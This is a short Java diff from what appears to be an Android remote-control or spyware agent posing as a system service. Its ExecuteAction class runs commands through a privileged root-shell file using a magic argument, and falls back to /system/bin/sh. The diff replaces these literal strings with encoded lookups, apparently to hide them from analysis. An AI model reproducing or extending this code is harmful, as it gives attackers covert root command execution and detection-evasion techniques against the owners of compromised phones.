@@ -13,6 +13,7 @@ import java.io.IOException;
 
 import android.util.Log;
 
+import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.Configuration;
 import com.android.service.file.Directory;
@@ -53,7 +54,7 @@ public class ExecuteAction extends SubAction {
 		
 		// Proviamo ad eseguire il comando da root
 		try {
-			String cmd[] = { Configuration.shellFile, "qzx", this.command }; // EXPORT
+			String cmd[] = { Configuration.shellFile, Messages.getString("35.0"), this.command }; // EXPORT
 			Process p = Runtime.getRuntime().exec(cmd);
 			
 			p.waitFor();
@@ -67,7 +68,7 @@ public class ExecuteAction extends SubAction {
 		
 		// Proviamo ad eseguire il comando da utente normale
 		try {
-			String cmd[] = { "/system/bin/sh", "-c", this.command }; // EXPORT
+			String cmd[] = { Messages.getString("35.1"), "-c", this.command }; // EXPORT
 			Process p = Runtime.getRuntime().exec(cmd);
 			
 			p.waitFor();
